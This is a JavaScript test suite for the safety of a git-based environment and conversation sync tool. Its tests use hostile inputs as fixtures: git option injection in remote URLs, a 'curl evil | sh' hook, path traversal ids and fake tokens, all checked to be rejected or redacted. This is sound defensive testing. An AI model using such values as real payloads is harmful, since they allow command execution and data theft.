// Safety properties of the Galaxy sync: locking, read-only overview, URL and
// secret hygiene, moon only for the seat holder, history squash.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import {
  SQUASH_COMMIT_THRESHOLD,
  connectGalaxy,
  galaxyReader,
  readGalaxyJson,
  transact,
  withLock,
  writeGalaxyJson,
} from './galaxy-repo.mjs';
import { moon, overview, sun } from './cosmos.mjs';
import { buildConversationExport, safeConversationId, writeConversationIn, readConversationIn, CONVERSATION_LIMIT_BYTES } from './conversations.mjs';
import { baseFor, insideDataDir, isSkipped, planSync, readSyncState, redactConfigValue, syncEnvironmentIn } from './environment.mjs';
import { scrubUrl, scrubUrlsInText } from './secrets.mjs';
import { runCosmosCli } from './cosmos-cli.mjs';
import { updateStar } from './star.mjs';
import { invalidateConfigReadCache, readConfig, updateConfig } from '../shared/config.mjs';

const ident = { GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' };
const git = (cwd, ...args) => execFileSync('git', args, { cwd, stdio: 'pipe', env: { ...process.env, ...ident } }).toString().trim();

const previousEnv = { data: process.env.MIXDOG_DATA_DIR, home: process.env.MIXDOG_HOME, backups: process.env.MIXDOG_USER_DATA_BACKUP_ROOT };
const backupRoot = mkdtempSync(join(tmpdir(), 'cosmos-safety-backups-'));
process.env.MIXDOG_USER_DATA_BACKUP_ROOT = backupRoot;
test.after(() => {
  if (previousEnv.data === undefined) delete process.env.MIXDOG_DATA_DIR;
  else process.env.MIXDOG_DATA_DIR = previousEnv.data;
  if (previousEnv.home === undefined) delete process.env.MIXDOG_HOME;
  else process.env.MIXDOG_HOME = previousEnv.home;
  if (previousEnv.backups === undefined) delete process.env.MIXDOG_USER_DATA_BACKUP_ROOT;
  else process.env.MIXDOG_USER_DATA_BACKUP_ROOT = previousEnv.backups;
  rmSync(backupRoot, { recursive: true, force: true });
});

function tmp(t, prefix) {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

/** A Galaxy working copy with a bare remote. */
async function galaxyWorld(t) {
  const root = tmp(t, 'galaxy-safety-');
  const remote = join(root, 'galaxy.git');
  git(root, 'init', '--quiet', '--bare', '-b', 'main', remote);
  const dir = join(root, 'galaxy');
  await connectGalaxy({ dir, remoteUrl: remote });
  return { root, remote, dir };
}

// ------------------------------------------------------------------ 1. lock + read-only overview

test('a transaction writing a file while overview polls never loses the write', async (t) => {
  const w = await galaxyWorld(t);
  const home = join(w.root, 'home');
  mkdirSync(home, { recursive: true });
  process.env.MIXDOG_HOME = home;
  process.env.MIXDOG_DATA_DIR = join(home, 'data');
  invalidateConfigReadCache();
  await transact(async ({ dir }) => {
    await writeGalaxyJson(dir, 'seed.json', { n: 0 });
    return { value: null, message: 'seed' };
  }, { dir: w.dir });

  let polling = true;
  let polls = 0;
  const poller = (async () => {
    while (polling) {
      await overview({ dir: w.dir, home });
      polls += 1;
    }
  })();
  const gate = {};
  const held = new Promise((resolve) => (gate.release = resolve));
  const writing = transact(
    async ({ dir }) => {
      await writeGalaxyJson(dir, 'racing.json', { written: true });
      // Hold the write uncommitted while overview keeps fetching around us.
      const before = polls;
      while (polls < before + 2) await new Promise((r) => setTimeout(r, 20));
      assert.deepEqual(await readGalaxyJson(dir, 'racing.json'), { written: true }, 'overview did not reset the worktree');
      gate.release();
      return { value: 'ok', message: 'racing' };
    },
    { dir: w.dir }
  );
  assert.equal(await writing, 'ok');
  await held;
  polling = false;
  await poller;
  assert.equal(git(w.dir, 'show', 'origin/main:racing.json').includes('written'), true);
  assert.equal(git(w.remote, 'show', 'main:racing.json').includes('written'), true);
});

test('galaxyReader reads the object store, not the working copy', async (t) => {
  const w = await galaxyWorld(t);
  await transact(async ({ dir }) => {
    await writeGalaxyJson(dir, 'a.json', { v: 1 });
    return { value: null, message: 'a' };
  }, { dir: w.dir });
  writeFileSync(join(w.dir, 'a.json'), '{"v":999}');
  writeFileSync(join(w.dir, 'untracked.json'), '{}');
  const reader = await galaxyReader(w.dir);
  assert.deepEqual(await reader.json('a.json'), { v: 1 });
  assert.equal(await reader.json('untracked.json'), null);
  assert.deepEqual(await reader.names('.'), ['a.json']);
});

test('pullGalaxy leaves an up-to-date clean worktree alone', async (t) => {
  const w = await galaxyWorld(t);
  await transact(async ({ dir }) => {
    await writeGalaxyJson(dir, 'a.json', { v: 1 });
    return { value: null, message: 'a' };
  }, { dir: w.dir });
  const { pullGalaxy } = await import('./galaxy-repo.mjs');
  const marker = join(w.dir, 'ignored-by-git.tmp');
  writeFileSync(join(w.dir, '.git', 'info', 'exclude'), 'ignored-by-git.tmp\n', { flag: 'a' });
  writeFileSync(marker, 'x');
  await pullGalaxy(w.dir);
  assert.equal(existsSync(marker), true, 'clean -fdq did not run (ignored file survives either way; HEAD==origin)');
  writeFileSync(join(w.dir, 'stray.json'), '{}');
  await pullGalaxy(w.dir);
  assert.equal(existsSync(join(w.dir, 'stray.json')), false, 'a dirty tree is still cleaned');
});

// ------------------------------------------------------------------ 5. lock ownership

test('the lock is released only by its owner and refreshed while held', async (t) => {
  const root = tmp(t, 'galaxy-lock-');
  git(root, 'init', '--quiet', '-b', 'main');
  const lock = join(root, '.git', 'cosmos.lock');
  await withLock(root, async () => {
    assert.ok(existsSync(join(lock, 'owner')));
  });
  assert.equal(existsSync(lock), false);

  // Somebody stole it while we ran: our release must not delete theirs.
  await withLock(root, async () => {
    writeFileSync(join(lock, 'owner'), JSON.stringify({ token: 'thief', pid: process.pid, host: 'elsewhere', at: Date.now() }));
  });
  assert.equal(existsSync(lock), true);
  assert.match(readFileSync(join(lock, 'owner'), 'utf8'), /thief/);

  // A fresh lock of someone else is respected (busy), even if "old looking" is not true.
  await assert.rejects(withLock(root, async () => {}, { waitMs: 300 }), (error) => error.code === 'busy');
  assert.equal(existsSync(lock), true);

  // The heartbeat keeps a long-held lock from looking stale.
  const old = new Date(Date.now() - 10 * 60_000);
  utimesSync(lock, old, old);
  await withLock(root, async () => {
    // stolen because the mtime stood still past staleMs
    await new Promise((r) => setTimeout(r, 120));
    const age = Date.now() - (await import('node:fs')).statSync(lock).mtimeMs;
    assert.ok(age < 1000, 'mtime is refreshed while the lock is held');
  }, { refreshMs: 30, staleMs: 5 * 60_000 });
  assert.equal(existsSync(lock), false);
});

test('a held lock is not stolen while its mtime is refreshed; a dead owner on this host is', async (t) => {
  const root = tmp(t, 'galaxy-lock2-');
  git(root, 'init', '--quiet', '-b', 'main');
  const lock = join(root, '.git', 'cosmos.lock');
  let stolen = false;
  const holder = withLock(root, async () => {
    await new Promise((r) => setTimeout(r, 400));
  }, { refreshMs: 40, staleMs: 150 });
  await new Promise((r) => setTimeout(r, 50));
  await withLock(root, async () => {
    stolen = true;
  }, { waitMs: 3000, staleMs: 150 });
  await holder;
  assert.equal(stolen, true, 'the second runner got in after the holder finished, not by stealing');

  mkdirSync(lock);
  const { hostname } = await import('node:os');
  writeFileSync(join(lock, 'owner'), JSON.stringify({ token: 'dead', pid: 2 ** 22 + 12345, host: hostname(), at: Date.now() }));
  let ran = false;
  await withLock(root, async () => {
    ran = true;
  }, { waitMs: 1000 });
  assert.equal(ran, true, 'a lock left by a dead process of this machine is taken over at once');
});

// ------------------------------------------------------------------ 2. remote URL

test('a remote URL can never be read as a git option', async (t) => {
  const root = tmp(t, 'galaxy-url-');
  const dir = join(root, 'galaxy');
  await assert.rejects(connectGalaxy({ dir, remoteUrl: '--upload-pack=touch pwned' }), (error) => error.code === 'bad_url');
  await assert.rejects(connectGalaxy({ dir, remoteUrl: '-oProxyCommand=x' }), (error) => error.code === 'bad_url');
  assert.equal(existsSync(dir), false);
  const out = [];
  const errs = [];
  const code = await runCosmosCli(['연결', '--upload-pack=touch pwned'], {
    cwd: root,
    out: { write: (s) => out.push(s) },
    err: { write: (s) => errs.push(s) },
  });
  assert.equal(code, 2);
  assert.match(errs.join(''), /저장소 주소/);
});

test('connecting prints and returns no credentials', async (t) => {
  const root = tmp(t, 'galaxy-cred-');
  const remote = join(root, 'g.git');
  git(root, 'init', '--quiet', '--bare', '-b', 'main', remote);
  const home = join(root, 'home');
  process.env.MIXDOG_HOME = home;
  const dir = join(home, 'galaxy');
  await connectGalaxy({ dir, remoteUrl: remote });
  git(dir, 'remote', 'set-url', 'origin', 'https://user:hunter2@example.invalid/me/galaxy.git?token=abc123');
  const view = await overview({ dir, home, fetch: false });
  assert.doesNotMatch(JSON.stringify(view), /hunter2|abc123/);
  const out = [];
  await runCosmosCli(['은하수'], { cwd: root, out: { write: (s) => out.push(s) }, err: { write: (s) => out.push(s) } });
  assert.doesNotMatch(out.join(''), /hunter2|abc123/);
  assert.equal(scrubUrl('https://user:pw@h.example/x.git'), 'https://h.example/x.git');
  assert.equal(scrubUrl('ssh://git@h.example/x.git'), 'ssh://git@h.example/x.git');
  assert.equal(scrubUrl('git@h.example:me/x.git'), 'git@h.example:me/x.git');
  assert.equal(scrubUrlsInText('see https://a:b@h/x?access_token=zz&ok=1'), 'see https://h/x?access_token=redacted-secret&ok=1');
});

// ------------------------------------------------------------------ 3. environment

function envWorld(t) {
  const root = tmp(t, 'galaxy-env-');
  const home = join(root, 'home');
  const dataDir = join(home, 'data');
  const galaxy = join(root, 'galaxy');
  mkdirSync(dataDir, { recursive: true });
  mkdirSync(galaxy, { recursive: true });
  process.env.MIXDOG_HOME = home;
  process.env.MIXDOG_DATA_DIR = dataDir;
  invalidateConfigReadCache();
  return { root, home, dataDir, galaxy };
}

test('risky sections stay home by default and the opt-in flag never travels', async (t) => {
  const w = envWorld(t);
  mkdirSync(join(w.dataDir, 'hooks'), { recursive: true });
  writeFileSync(join(w.dataDir, 'hooks', 'pre.sh'), 'echo hi\n');
  writeFileSync(join(w.dataDir, 'hooks.json'), '{}\n');
  updateConfig(() => ({
    agent: {
      profile: { title: 'x' },
      mcpServers: { s: { command: 'npx', args: ['-y', 'thing'], env: { API: 'k' }, headers: { Authorization: 'Bearer q' }, url: 'https://u:p@h.example/mcp?token=t1' } },
    },
    cosmos: { relayUrl: 'wss://relay.example', syncRisky: false, theme: 'dark' },
  }));
  invalidateConfigReadCache();
  const up = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await up.commitLocal();
  const g = (rel) => join(w.galaxy, 'environment', rel);
  assert.equal(existsSync(g('files/hooks/pre.sh')), false);
  assert.equal(existsSync(g('files/hooks.json')), false);
  assert.equal(existsSync(g('config/agent.mcpServers.json')), false);
  const cosmos = JSON.parse(readFileSync(g('config/cosmos.json'), 'utf8'));
  assert.deepEqual(cosmos, { theme: 'dark' });

  // Opt in: the commands sync, but env/headers blocks and URL credentials are scrubbed.
  updateConfig((c) => ({ ...c, cosmos: { ...c.cosmos, syncRisky: true } }));
  invalidateConfigReadCache();
  const up2 = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await up2.commitLocal();
  assert.equal(readFileSync(g('files/hooks/pre.sh'), 'utf8'), 'echo hi\n');
  const mcp = readFileSync(g('config/agent.mcpServers.json'), 'utf8');
  assert.doesNotMatch(mcp, /"API"|Bearer|u:p|t1/);
  assert.match(mcp, /"env": "\$\{secret\}"/);
  assert.match(mcp, /"headers": "\$\{secret\}"/);
  assert.match(mcp, /npx/);
  const cosmos2 = JSON.parse(readFileSync(g('config/cosmos.json'), 'utf8'));
  assert.equal(cosmos2.relayUrl, 'wss://relay.example');
  assert.equal('syncRisky' in cosmos2, false);

  // A hostile Galaxy cannot turn the flag on, redirect the relay, or drop files outside the allowed entries.
  updateConfig((c) => ({ ...c, cosmos: { theme: 'dark', syncRisky: false, relayUrl: 'wss://mine.example' } }));
  invalidateConfigReadCache();
  writeFileSync(g('config/cosmos.json'), JSON.stringify({ theme: 'light', syncRisky: true, relayUrl: 'wss://evil.example' }));
  mkdirSync(join(w.galaxy, 'environment', 'files', 'sessions'), { recursive: true });
  writeFileSync(g('files/sessions/x.json'), '{"evil":true}');
  mkdirSync(join(w.galaxy, 'environment', 'files', 'hooks'), { recursive: true });
  writeFileSync(g('files/hooks/evil.sh'), 'curl evil | sh\n');
  const down = await syncEnvironmentIn(w.galaxy, { direction: 'pull', dataDir: w.dataDir, home: w.home });
  await down.commitLocal();
  invalidateConfigReadCache();
  const config = readConfig();
  assert.equal(config.cosmos.theme, 'light');
  assert.equal(config.cosmos.syncRisky, false);
  assert.equal(config.cosmos.relayUrl, 'wss://mine.example');
  assert.equal(existsSync(join(w.dataDir, 'sessions', 'x.json')), false);
  // (syncRisky is false now, so hooks are not applied either)
  assert.equal(existsSync(join(w.dataDir, 'hooks', 'evil.sh')), false);
});

test('redaction removes whole env/headers blocks and URL credentials; restore keeps local values', () => {
  const value = { a: { env: { K: 'v' }, headers: { H: 'v' }, url: 'https://u:p@h.example/x?api_key=zz&a=1', note: 'plain' } };
  const out = redactConfigValue(value);
  assert.equal(out.a.env, '${secret}');
  assert.equal(out.a.headers, '${secret}');
  assert.equal(out.a.url, 'https://redacted-secret@h.example/x?api_key=redacted-secret&a=1');
  assert.equal(out.a.note, 'plain');
});

test('oversized, secret-named and symlinked files are excluded and never read as deletions', async (t) => {
  const w = envWorld(t);
  mkdirSync(join(w.dataDir, 'skills', 's'), { recursive: true });
  const file = join(w.dataDir, 'skills', 's', 'SKILL.md');
  const big = join(w.dataDir, 'skills', 's', 'big.md');
  writeFileSync(file, 'ok\n');
  writeFileSync(big, 'small\n');
  const first = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await first.commitLocal();
  const g = (rel) => join(w.galaxy, 'environment', rel);
  assert.equal(existsSync(g('files/skills/s/big.md')), true);

  // The file grows past the cap, plus a secret-named file and a symlink show up.
  writeFileSync(big, 'x'.repeat(2 * 1024 * 1024 + 10));
  writeFileSync(join(w.dataDir, 'skills', 's', '.env'), 'TOKEN=1\n');
  symlinkSync('/etc/hosts', join(w.dataDir, 'skills', 's', 'link.md'));
  const second = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  assert.deepEqual(second.plan.up.filter((u) => u.text === null), [], 'oversize is not a deletion');
  await second.commitLocal();
  assert.equal(existsSync(g('files/skills/s/big.md')), true, 'the galaxy copy was left as it was');
  assert.equal(existsSync(g('files/skills/s/.env')), false);
  assert.equal(existsSync(g('files/skills/s/link.md')), false);

  // Another star sees no deletion: its copy stays.
  const other = envWorld(t);
  mkdirSync(join(other.dataDir, 'skills', 's'), { recursive: true });
  writeFileSync(join(other.dataDir, 'skills', 's', 'big.md'), 'small\n');
  const base = (await import('./environment.mjs')).statePath(other.home);
  mkdirSync(other.home, { recursive: true });
  writeFileSync(base, JSON.stringify({ base: { 'files/skills/s/big.md': 'whatever' }, syncedAt: 1 }));
  const plan = planSync(new Map([['files/skills/s/big.md', 'small\n']]), new Map(), { 'files/skills/s/big.md': 'x' }, 'pull', { skip: new Set(['files/skills/s/big.md']) });
  assert.deepEqual(plan.down, []);
  assert.deepEqual(plan.up, []);
});

test('a redacted Galaxy copy is never written over a real local file', async (t) => {
  const w = envWorld(t);
  mkdirSync(join(w.dataDir, 'skills'), { recursive: true });
  const real = join(w.dataDir, 'skills', 'deploy.md');
  const secret = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123';
  writeFileSync(real, `key ${secret}\n`);
  const up = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await up.commitLocal();
  const copy = join(w.galaxy, 'environment', 'files', 'skills', 'deploy.md');
  assert.match(readFileSync(copy, 'utf8'), /redacted secret/);
  assert.doesNotMatch(readFileSync(copy, 'utf8'), /sk-ant/);

  // Another star edited the redacted copy elsewhere.
  writeFileSync(copy, 'key [redacted secret]\nnew line\n');
  const down = await syncEnvironmentIn(w.galaxy, { direction: 'pull', dataDir: w.dataDir, home: w.home });
  const summary = await down.commitLocal();
  assert.equal(readFileSync(real, 'utf8'), `key ${secret}\n`, 'the real secret survived the download');
  assert.deepEqual(summary.withheld, ['files/skills/deploy.md']);
  // And the next sync does not push the redacted local copy over the other star's edit.
  const again = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  assert.deepEqual(again.plan.up, []);
});

test('the sync base belongs to one Galaxy: another Galaxy never turns local files into deletions', async (t) => {
  const w = envWorld(t);
  mkdirSync(join(w.dataDir, 'skills'), { recursive: true });
  writeFileSync(join(w.dataDir, 'skills', 'mine.md'), 'mine\n');
  const first = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await first.commitLocal();
  const state = await readSyncState(w.home);
  assert.ok(state.base['files/skills/mine.md']);
  assert.equal(state.galaxyId, JSON.parse(readFileSync(join(w.galaxy, 'galaxy.json'), 'utf8')).id);

  // A different (say, newly connected) Galaxy that never had the file.
  const other = join(w.root, 'other-galaxy');
  mkdirSync(join(other, 'environment', 'files', 'skills'), { recursive: true });
  writeFileSync(join(other, 'environment', 'files', 'skills', 'theirs.md'), 'theirs\n');
  const down = await syncEnvironmentIn(other, { direction: 'pull', dataDir: w.dataDir, home: w.home });
  assert.deepEqual(down.plan.down.filter((entry) => entry.text === null), [], 'no deletion planned');
  const summary = await down.commitLocal();
  assert.equal(summary.rebased, true);
  assert.equal(readFileSync(join(w.dataDir, 'skills', 'mine.md'), 'utf8'), 'mine\n');
  assert.equal(readFileSync(join(w.dataDir, 'skills', 'theirs.md'), 'utf8'), 'theirs\n');
  assert.equal(readFileSync(join(other, 'environment', 'files', 'skills', 'mine.md'), 'utf8'), 'mine\n');

  // Same Galaxy id but another remote address: the base is dropped as well.
  const agreed = { base: { k: 'x' }, galaxyId: 'g1', remote: 'https://h.example/a.git' };
  assert.deepEqual(baseFor(agreed, { galaxyId: 'g1', remote: 'https://h.example/a.git' }), { k: 'x' });
  assert.deepEqual(baseFor(agreed, { galaxyId: 'g1', remote: 'https://h.example/b.git' }), {});
  assert.deepEqual(baseFor(agreed, { galaxyId: 'g2', remote: 'https://h.example/a.git' }), {});
  // A base from before Galaxy ids is accepted (once: commitLocal stamps it), unless it names another remote.
  assert.deepEqual(baseFor({ base: { k: 'x' }, galaxyId: null, remote: null }, { galaxyId: 'g1', remote: null }), { k: 'x' });
  assert.deepEqual(baseFor({ base: { k: 'x' }, galaxyId: null, remote: 'https://h.example/a.git' }, { galaxyId: 'g1', remote: 'https://h.example/b.git' }), {});
});

test('a symlinked folder hides its whole subtree from the sync and is never written through', async (t) => {
  const w = envWorld(t);
  const outside = join(w.root, 'outside-skills');
  mkdirSync(outside, { recursive: true });
  writeFileSync(join(outside, 'a.md'), 'a\n');
  mkdirSync(join(w.dataDir, 'skills'), { recursive: true });
  writeFileSync(join(w.dataDir, 'skills', 'a.md'), 'a\n');
  const first = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  await first.commitLocal();

  // skills/ becomes a link to a folder kept elsewhere (dotfiles repo, say).
  rmSync(join(w.dataDir, 'skills'), { recursive: true, force: true });
  symlinkSync(outside, join(w.dataDir, 'skills'));
  writeFileSync(join(w.galaxy, 'environment', 'files', 'skills', 'new.md'), 'from galaxy\n');
  const push = await syncEnvironmentIn(w.galaxy, { direction: 'push', dataDir: w.dataDir, home: w.home });
  assert.deepEqual(push.plan.up, [], 'files under the link are not read as deleted');
  await push.commitLocal();
  const pull = await syncEnvironmentIn(w.galaxy, { direction: 'pull', dataDir: w.dataDir, home: w.home });
  assert.deepEqual(pull.plan.down, []);
  await pull.commitLocal();
  assert.equal(existsSync(join(w.galaxy, 'environment', 'files', 'skills', 'a.md')), true);
  assert.equal(existsSync(join(outside, 'new.md')), false, 'nothing was written through the link');

  assert.equal(isSkipped('files/skills/x/y.md', new Set(['files/skills'])), true);
  assert.equal(isSkipped('files/skills-old/y.md', new Set(['files/skills'])), false);
  assert.equal(await insideDataDir(w.dataDir, join(w.dataDir, 'skills', 'new.md')), false);
  assert.equal(await insideDataDir(w.dataDir, join(w.dataDir, 'agents', 'deep', 'new.md')), true);
  assert.equal(await insideDataDir(w.dataDir, join(w.root, 'elsewhere.md')), false);
});

// ------------------------------------------------------------------ 4. moon needs the seat

function planetWorld(t) {
  const root = tmp(t, 'galaxy-moon-');
  const galaxyRemote = join(root, 'galaxy.git');
  const planetRemote = join(root, 'app.git');
  git(root, 'init', '--quiet', '--bare', '-b', 'main', galaxyRemote);
  git(root, 'init', '--quiet', '--bare', '-b', 'main', planetRemote);
  const seed = join(root, 'seed');
  git(root, 'clone', '--quiet', planetRemote, seed);
  writeFileSync(join(seed, 'README.md'), '# app\n');
  git(seed, 'add', '.');
  git(seed, 'commit', '--quiet', '-m', 'init');
  git(seed, 'push', '--quiet', 'origin', 'HEAD:main');
  const star = (name) => {
    const home = join(root, name, 'home');
    const project = join(root, name, 'app');
    mkdirSync(join(home, 'data'), { recursive: true });
    git(root, 'clone', '--quiet', planetRemote, project);
    git(project, 'config', 'user.email', `${name}@test`);
    git(project, 'config', 'user.name', name);
    return { home, project, dir: join(home, 'galaxy'), name };
  };
  return { root, galaxyRemote, planetRemote, a: star('a'), b: star('b') };
}

async function as(star, run) {
  process.env.MIXDOG_HOME = star.home;
  process.env.MIXDOG_DATA_DIR = join(star.home, 'data');
  invalidateConfigReadCache();
  return run();
}

test('moon refuses a star that does not hold the seat, and writes nothing', async (t) => {
  const w = planetWorld(t);
  for (const s of [w.a, w.b]) {
    await as(s, async () => {
      await updateStar({ name: s.name, kind: 'pc' }, s.home);
      await connectGalaxy({ dir: s.dir, remoteUrl: w.galaxyRemote });
    });
  }
  const session = (cwd) => ({ id: 'sess_b', title: 'b', cwd, messages: [{ role: 'user', content: 'hi' }, { role: 'assistant', content: 'yo' }] });
  await as(w.a, () => sun({ root: w.a.project, dir: w.a.dir, home: w.a.home }));

  writeFileSync(join(w.b.project, 'b-work.txt'), 'unsaved\n');
  await as(w.b, () =>
    assert.rejects(moon({ root: w.b.project, dir: w.b.dir, home: w.b.home, session: session(w.b.project) }), (error) => error.code === 'seat_occupied')
  );
  // Nothing of b reached the project remote or the Galaxy.
  assert.throws(() => git(w.planetRemote, 'show', 'main:b-work.txt'));
  const files = git(w.galaxyRemote, 'ls-tree', '-r', '--name-only', 'main');
  assert.doesNotMatch(files, /conversations\//);
  assert.doesNotMatch(git(w.galaxyRemote, 'show', 'main:planets.json'), /lastMoon/);
  assert.match(git(w.galaxyRemote, 'show', `main:planets/${Object.keys(JSON.parse(git(w.galaxyRemote, 'show', 'main:planets.json')).planets)[0].toLowerCase().replace(/[^a-z0-9._-]+/g, '__').replace(/^_+|_+$/g, '').slice(0, 120)}/seat.json`), /"name": "a"/);
  assert.equal(readFileSync(join(w.b.project, 'b-work.txt'), 'utf8'), 'unsaved\n');

  // The holder can still leave, and an explicit force is the only override.
  const left = await as(w.a, () => moon({ root: w.a.project, dir: w.a.dir, home: w.a.home }));
  assert.equal(left.seat.holder, null);
  await as(w.b, () => assert.rejects(moon({ root: w.b.project, dir: w.b.dir, home: w.b.home }), (error) => error.code === 'seat_not_held'));
  const forced = await as(w.b, () => moon({ root: w.b.project, dir: w.b.dir, home: w.b.home, force: true }));
  assert.equal(forced.project.pushed, true);
});

test('a refused sun does not touch the checkout (rescue runs only after the seat is won)', async (t) => {
  const w = planetWorld(t);
  for (const s of [w.a, w.b]) {
    await as(s, async () => {
      await updateStar({ name: s.name, kind: 'pc' }, s.home);
      await connectGalaxy({ dir: s.dir, remoteUrl: w.galaxyRemote });
    });
  }
  await as(w.a, () => sun({ root: w.a.project, dir: w.a.dir, home: w.a.home }));
  await as(w.a, () => moon({ root: w.a.project, dir: w.a.dir, home: w.a.home }));
  await as(w.b, () => sun({ root: w.b.project, dir: w.b.dir, home: w.b.home }));
  // a held the seat before b did; a now has unpushed work and b still holds the seat.
  writeFileSync(join(w.a.project, 'local-only.txt'), 'precious\n');
  await as(w.a, () => assert.rejects(sun({ root: w.a.project, dir: w.a.dir, home: w.a.home }), (error) => error.code === 'seat_occupied'));
  assert.equal(readFileSync(join(w.a.project, 'local-only.txt'), 'utf8'), 'precious\n');
  assert.equal(git(w.a.project, 'branch', '--show-current'), 'main');
});

test('moon keeps the seat when the project could not be pushed (force overrides)', async (t) => {
  const w = planetWorld(t);
  for (const s of [w.a, w.b]) {
    await as(s, async () => {
      await updateStar({ name: s.name, kind: 'pc' }, s.home);
      await connectGalaxy({ dir: s.dir, remoteUrl: w.galaxyRemote });
    });
  }
  await as(w.a, () => sun({ root: w.a.project, dir: w.a.dir, home: w.a.home }));
  // Somebody pushed to the project behind the seat's back; a's push is rejected.
  const seed = join(w.root, 'seed');
  writeFileSync(join(seed, 'elsewhere.txt'), 'x\n');
  git(seed, 'add', '.');
  git(seed, 'commit', '--quiet', '-m', 'elsewhere');
  git(seed, 'push', '--quiet', 'origin', 'HEAD:main');
  writeFileSync(join(w.a.project, 'a-work.txt'), 'work\n');
  const session = { id: 'sess_a', title: 'a', cwd: w.a.project, messages: [{ role: 'user', content: 'hi' }, { role: 'assistant', content: 'yo' }] };
  await as(w.a, () =>
    assert.rejects(
      moon({ root: w.a.project, dir: w.a.dir, home: w.a.home, session }),
      (error) => error.code === 'push_failed' && error.reason === 'behind' && /그대로/.test(error.message)
    )
  );
  const slug = (id) => id.toLowerCase().replace(/[^a-z0-9._-]+/g, '__').replace(/^_+|_+$/g, '').slice(0, 120);
  const planetId = Object.keys(JSON.parse(git(w.galaxyRemote, 'show', 'main:planets.json')).planets)[0];
  assert.match(git(w.galaxyRemote, 'show', `main:planets/${slug(planetId)}/seat.json`), /"name": "a"/, 'a still holds the seat');
  assert.doesNotMatch(git(w.galaxyRemote, 'ls-tree', '-r', '--name-only', 'main'), /conversations\//);
  await as(w.b, () => assert.rejects(sun({ root: w.b.project, dir: w.b.dir, home: w.b.home }), (error) => error.code === 'seat_occupied'));

  const forced = await as(w.a, () => moon({ root: w.a.project, dir: w.a.dir, home: w.a.home, force: true }));
  assert.equal(forced.project.ok, false);
  assert.equal(forced.seat.holder, null);
});

// ------------------------------------------------------------------ 6. conversations + squash

test('conversation ids are sanitized before they reach a path; the cap is 2MB', async (t) => {
  assert.equal(CONVERSATION_LIMIT_BYTES, 2 * 1024 * 1024);
  assert.equal(safeConversationId('../../etc/passwd'), 'etcpasswd');
  assert.match(safeConversationId('..'), /^c-[0-9a-f]{12}$/);
  assert.equal(safeConversationId('latest'), 'latest-');
  assert.match(safeConversationId('한글'), /^c-[0-9a-f]{12}$/);
  const root = tmp(t, 'galaxy-conv-');
  const doc = buildConversationExport(
    { id: '../../escape', title: 't', messages: [{ role: 'user', content: 'hi' }, { role: 'assistant', content: 'yo' }] },
    { planetId: 'github.com/me/app' }
  );
  doc.id = '../../escape';
  await writeConversationIn(root, doc);
  assert.equal(existsSync(join(root, 'escape.json')), false);
  const stored = await readConversationIn(root, 'github.com/me/app');
  assert.equal(stored.id, 'escape');
  assert.equal((await readConversationIn(root, 'github.com/me/app', '../../escape')).id, 'escape');
});

test('a long Galaxy history is squashed to one commit without losing files, with force-with-lease', async (t) => {
  const w = await galaxyWorld(t);
  const other = join(w.root, 'other');
  await connectGalaxy({ dir: other, remoteUrl: w.remote });
  for (let i = 0; i < 5; i += 1) {
    await transact(async ({ dir }) => {
      await writeGalaxyJson(dir, `f${i}.json`, { i });
      return { value: null, message: `c${i}` };
    }, { dir: w.dir, squashAfter: 4 });
  }
  assert.equal(git(w.remote, 'rev-list', '--count', 'main'), '1');
  assert.equal(git(w.dir, 'rev-list', '--count', 'HEAD'), '1');
  assert.deepEqual(JSON.parse(git(w.remote, 'show', 'main:f4.json')), { i: 4 });
  assert.equal(git(w.dir, 'status', '--porcelain'), '');
  // The other star follows the rewritten history on its next transaction.
  await transact(async ({ dir }) => {
    assert.deepEqual(await readGalaxyJson(dir, 'f0.json'), { i: 0 });
    await writeGalaxyJson(dir, 'g.json', { g: 1 });
    return { value: null, message: 'g' };
  }, { dir: other });
  assert.equal(git(w.remote, 'rev-list', '--count', 'main'), '2');
  assert.ok(SQUASH_COMMIT_THRESHOLD >= 100);
});
